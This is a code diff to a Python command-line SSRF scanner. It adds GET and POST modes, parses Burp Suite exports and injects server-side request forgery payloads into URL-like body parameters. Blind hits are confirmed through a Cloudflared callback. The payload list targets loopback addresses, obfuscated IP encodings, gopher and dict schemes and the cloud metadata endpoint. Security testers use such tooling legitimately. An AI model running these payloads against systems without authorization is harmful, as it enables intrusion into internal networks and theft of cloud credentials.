@@ -117,16 +117,43 @@ def server(host, port, cloudflared):
     server_instance.run(host=host, port=port)
 
 @cli.command()
-@click.option('--subdomains', '-s', required=True, help='Path to subdomains file or Burp Suite XML (with --post)')
+@click.option('--get', type=click.Path(exists=True), help='Path to subdomains file for GET/waybackurls scan')
+@click.option('--post', type=click.Path(exists=True), help='Path to Burp Suite XML file for POST scan')
 @click.option('--output', '-o', help='Output file for results')
 @click.option('--callback-url', '-c', help='Custom callback URL (default: auto-detect from Cloudflared tunnel)')
 @click.option('--tools', '-t', help='Comma-separated list of tools to use for URL extraction (gauplus,gau,waybackurls,katana)', default=None)
-@click.option('--post', is_flag=True, help='Scan POST requests from Burp Suite XML file')
-def scan(subdomains, output, callback_url, tools, post):
-    """Scan subdomains or Burp Suite POST requests for SSRF vulnerabilities"""
+def scan(get, post, output, callback_url, tools):
+    """Scan for SSRF vulnerabilities using GET or POST requests"""
+    # Enforce mutual exclusion and requirement
+    if (get and post) or (not get and not post):
+        print(f"{Fore.RED}❌ You must specify exactly one of --get or --post.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Use --get for GET/waybackurls scan, or --post for POST/Burp scan.{Style.RESET_ALL}")
+        return
+    # Check if callback server is running
+    config = Config()
+    server_url = f"http://127.0.0.1:{config.CALLBACK_SERVER_PORT}/health"
+    try:
+        import requests
+        resp = requests.get(server_url, timeout=5)
+        if resp.status_code != 200:
+            raise Exception
+    except Exception:
+        print(f"{Fore.RED}❌ Callback server is not running!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}💡 Start it with: python main.py server --cloudflared{Style.RESET_ALL}")
+        return
     tool_list = [t.strip() for t in tools.split(',')] if tools else None
     if post:
-        # POST scan mode: subdomains is a Burp Suite XML file
+        # Validate Burp Suite XML by content
+        try:
+            import xml.etree.ElementTree as ET
+            tree = ET.parse(post)
+            root = tree.getroot()
+            if root.tag.lower() != 'items' or not root.findall('item'):
+                raise ValueError
+        except Exception:
+            print(f"{Fore.RED}❌ The --post file does not appear to be a valid Burp Suite XML file.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}💡 It should have <items> as the root and contain <item> elements.{Style.RESET_ALL}")
+            return
         if not callback_url:
             callback_url = get_cloudflared_public_url()
             if callback_url:
@@ -137,19 +164,179 @@ def scan(subdomains, output, callback_url, tools, post):
                 print(f"{Fore.YELLOW}💡 Either start the server with: python main.py server --cloudflared{Style.RESET_ALL}")
                 print(f"{Fore.YELLOW}💡 Or provide custom callback URL with: -c https://<your-tunnel>.trycloudflare.com/callback{Style.RESET_ALL}")
                 return
-        asyncio.run(run_post_scan(subdomains, output, callback_url))
-        return
-    if not callback_url:
-        callback_url = get_cloudflared_public_url()
-        if callback_url:
-            callback_url = f"{callback_url}/callback"
-            print(f"{Fore.GREEN}🌐 Using Cloudflared callback URL: {callback_url}{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.RED}❌ No callback URL specified and no Cloudflared tunnel found{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}💡 Either start the server with: python main.py server --cloudflared{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}💡 Or provide custom callback URL with: -c https://<your-tunnel>.trycloudflare.com/callback{Style.RESET_ALL}")
+        # Patch: robust body param extraction for POST scan
+        import re, urllib.parse, json as js
+        from email.parser import BytesParser
+        from email.policy import default as email_default
+        def extract_url_params_from_body(body, headers):
+            url_params = []
+            content_type = headers.get('Content-Type', headers.get('content-type', '')).lower()
+            # Try JSON
+            try:
+                data = js.loads(body)
+                def walk_json(obj, parent=None):
+                    if isinstance(obj, dict):
+                        for k, v in obj.items():
+                            walk_json(v, k)
+                    elif isinstance(obj, list):
+                        for v in obj:
+                            walk_json(v, parent)
+                    elif isinstance(obj, str):
+                        if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', obj):
+                            url_params.append((parent or '', obj))
+                        # Try urldecode and check again
+                        try:
+                            decoded = urllib.parse.unquote(obj)
+                            if decoded != obj and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', decoded):
+                                url_params.append((parent or '', decoded))
+                        except Exception:
+                            pass
+                walk_json(data)
+                return url_params
+            except Exception:
+                pass
+            # Try multipart
+            if 'multipart/form-data' in content_type:
+                try:
+                    boundary = re.search(r'boundary=([^;]+)', content_type)
+                    if boundary:
+                        boundary = boundary.group(1)
+                        parser = BytesParser(policy=email_default)
+                        msg = parser.parsebytes((f'Content-Type: {content_type}\r\n\r\n' + body).encode())
+                        for part in msg.iter_parts():
+                            payload = part.get_payload(decode=True)
+                            name = part.get_param('name', header='content-disposition') or ''
+                            if payload:
+                                val = payload.decode(errors='ignore')
+                                if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', val):
+                                    url_params.append((name, val))
+                                try:
+                                    decoded = urllib.parse.unquote(val)
+                                    if decoded != val and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', decoded):
+                                        url_params.append((name, decoded))
+                                except Exception:
+                                    pass
+                except Exception:
+                    pass
+            # Try urlencoded
+            try:
+                qs = urllib.parse.parse_qs(body)
+                for k, vs in qs.items():
+                    for v in vs:
+                        if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', v):
+                            url_params.append((k, v))
+                        try:
+                            decoded = urllib.parse.unquote(v)
+                            if decoded != v and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', decoded):
+                                url_params.append((k, decoded))
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+            # Fallback: scan for URLs in raw body
+            for match in re.findall(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://[^\s\"\']+', body):
+                url_params.append(('raw', match))
+            return url_params
+        # Patch run_post_scan to use robust extraction
+        import types
+        async def patched_run_post_scan(burp_file, output_file, callback_url):
+            print(f"\n{Fore.GREEN}🚀 Starting POST SSRF scan (Burp Suite XML)...{Style.RESET_ALL}")
+            print(f"📁 Burp Suite file: {burp_file}")
+            print(f"🔗 Callback URL: {callback_url}")
+            import xml.etree.ElementTree as ET
+            import base64
+            tree = ET.parse(burp_file)
+            root = tree.getroot()
+            post_requests = []
+            for item in root.findall('item'):
+                # Try to get method from <method>, else infer from <request>
+                method = item.findtext('method')
+                request_raw = item.findtext('request')
+                # Handle base64-encoded requests
+                req_elem = item.find('request')
+                if req_elem is not None and req_elem.attrib.get('base64', 'false') == 'true' and request_raw:
+                    try:
+                        request_raw = base64.b64decode(request_raw).decode(errors='replace')
+                    except Exception:
+                        pass
+                url = item.findtext('url')
+                if not url:
+                    url_elem = item.find('url')
+                    if url_elem is not None and url_elem.text:
+                        url = url_elem.text
+                # If method is missing, try to infer from request_raw
+                if (not method or not method.strip()) and request_raw:
+                    first_line = request_raw.split('\n', 1)[0].strip()
+                    if first_line:
+                        method = first_line.split(' ', 1)[0].upper()
+                if method and method.strip().upper() == 'POST' and request_raw:
+                    req_lines = request_raw.split('\n')
+                    headers = {}
+                    body = ''
+                    in_body = False
+                    for line in req_lines[1:]:
+                        if line.strip() == '':
+                            in_body = True
+                            continue
+                        if in_body:
+                            body += line + '\n'
+                        else:
+                            if ':' in line:
+                                k, v = line.split(':', 1)
+                                headers[k.strip()] = v.strip()
+                    body = body.strip()
+                    post_requests.append({'url': url, 'headers': headers, 'body': body, 'raw': request_raw})
+            if not post_requests:
+                print(f"{Fore.RED}❌ No POST requests found in Burp file.{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}💡 If this is a Burp search export, ensure the <request> and <method> fields are present. If not, try exporting with a different Burp function.{Style.RESET_ALL}")
+                return
+            print(f"{Fore.YELLOW}Found {len(post_requests)} POST requests in Burp file.{Style.RESET_ALL}")
+            for req in post_requests:
+                req['url_params'] = extract_url_params_from_body(req['body'], req['headers'])
+            ssrf_targets = [
+                "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
+                "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
+                "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
+                "http://[::1]", "http://[::]",
+                "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
+                "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
+            ]
+            async with SSRFTester() as tester:
+                results = await tester.test_post_requests(post_requests, callback_url, ssrf_targets)
+            if output_file:
+                with open(output_file, 'w') as f:
+                    json.dump(results, f, indent=2)
+                print(f"💾 POST SSRF results saved to: {output_file}")
+            print(f"\n{Fore.GREEN}✅ POST SSRF scan completed!{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Blind SSRF results: {len(results['blind'])} | Internal SSRF results: {len(results['internal'])}{Style.RESET_ALL}")
             return
-    asyncio.run(run_scan(subdomains, output, callback_url, tool_list))
+        globals()['run_post_scan'] = patched_run_post_scan
+        asyncio.run(run_post_scan(post, output, callback_url))
+        return
+    if get:
+        # Validate plain text file (not XML)
+        try:
+            with open(get, 'r') as f:
+                first_line = f.readline()
+                if first_line.strip().startswith('<'):
+                    print(f"{Fore.RED}❌ The --get file does not appear to be a plain text subdomains file.{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}💡 It should be a list of subdomains, one per line.{Style.RESET_ALL}")
+                    return
+        except Exception:
+            print(f"{Fore.RED}❌ Could not read the --get file. Please check the file path and permissions.{Style.RESET_ALL}")
+            return
+        if not callback_url:
+            callback_url = get_cloudflared_public_url()
+            if callback_url:
+                callback_url = f"{callback_url}/callback"
+                print(f"{Fore.GREEN}🌐 Using Cloudflared callback URL: {callback_url}{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.RED}❌ No callback URL specified and no Cloudflared tunnel found{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}💡 Either start the server with: python main.py server --cloudflared{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}💡 Or provide custom callback URL with: -c https://<your-tunnel>.trycloudflare.com/callback{Style.RESET_ALL}")
+                return
+        asyncio.run(run_scan(get, output, callback_url, tool_list))
+        return
 
 @cli.command()
 def status():
@@ -413,12 +600,25 @@ async def run_post_scan(burp_file, output_file, callback_url):
     post_requests = []
     for item in root.findall('item'):
         method = item.findtext('method')
-        if method and method.strip().upper() == 'POST':
-            url = item.findtext('url')
-            request_raw = item.findtext('request')
-            if not url or not request_raw:
-                continue
-            # Extract headers and body from raw request
+        request_raw = item.findtext('request')
+        # Handle base64-encoded requests
+        req_elem = item.find('request')
+        if req_elem is not None and req_elem.attrib.get('base64', 'false') == 'true' and request_raw:
+            try:
+                request_raw = base64.b64decode(request_raw).decode(errors='replace')
+            except Exception:
+                pass
+        url = item.findtext('url')
+        if not url:
+            url_elem = item.find('url')
+            if url_elem is not None and url_elem.text:
+                url = url_elem.text
+        # If method is missing, try to infer from request_raw
+        if (not method or not method.strip()) and request_raw:
+            first_line = request_raw.split('\n', 1)[0].strip()
+            if first_line:
+                method = first_line.split(' ', 1)[0].upper()
+        if method and method.strip().upper() == 'POST' and request_raw:
             req_lines = request_raw.split('\n')
             headers = {}
             body = ''
@@ -437,6 +637,7 @@ async def run_post_scan(burp_file, output_file, callback_url):
             post_requests.append({'url': url, 'headers': headers, 'body': body, 'raw': request_raw})
     if not post_requests:
         print(f"{Fore.RED}❌ No POST requests found in Burp file.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}💡 If this is a Burp search export, ensure the <request> and <method> fields are present. If not, try exporting with a different Burp function.{Style.RESET_ALL}")
         return
     print(f"{Fore.YELLOW}Found {len(post_requests)} POST requests in Burp file.{Style.RESET_ALL}")
     # Step 2: For each POST, find URL-like params in body
@@ -457,15 +658,30 @@ async def run_post_scan(burp_file, output_file, callback_url):
                     if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', v):
                         url_params.append((k, v))
         return url_params
-    # Prepare for SSRF injection and scanning
+    # Prepare post_requests with url_params
     for req in post_requests:
-        url = req['url']
-        headers = req['headers']
-        body = req['body']
-        url_params = find_url_like_params(body)
-        print(f"\n{Fore.CYAN}POST {url}{Style.RESET_ALL}")
-        print(f"  Headers: {headers}")
-        print(f"  Body: {body}")
-        print(f"  URL-like params: {url_params}")
-    print(f"{Fore.YELLOW}[!] SSRF injection and scan logic to be implemented next.{Style.RESET_ALL}")
+        req['url_params'] = find_url_like_params(req['body'])
+    # SSRF targets for internal scan
+    ssrf_targets = [
+        "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
+        "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
+        "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
+        "http://[::1]", "http://[::]",
+        "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
+        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
+    ]
+    # Run SSRFTester for POST requests
+    async with SSRFTester() as tester:
+        results = await tester.test_post_requests(post_requests, callback_url, ssrf_targets)
+    # Save results if output file specified
+    if output_file:
+        with open(output_file, 'w') as f:
+            json.dump(results, f, indent=2)
+        print(f"💾 POST SSRF results saved to: {output_file}")
+    # Print summary
+    print(f"\n{Fore.GREEN}✅ POST SSRF scan completed!{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}Blind SSRF results: {len(results['blind'])} | Internal SSRF results: {len(results['internal'])}{Style.RESET_ALL}")
     return
+
+if __name__ == "__main__":
+    cli()
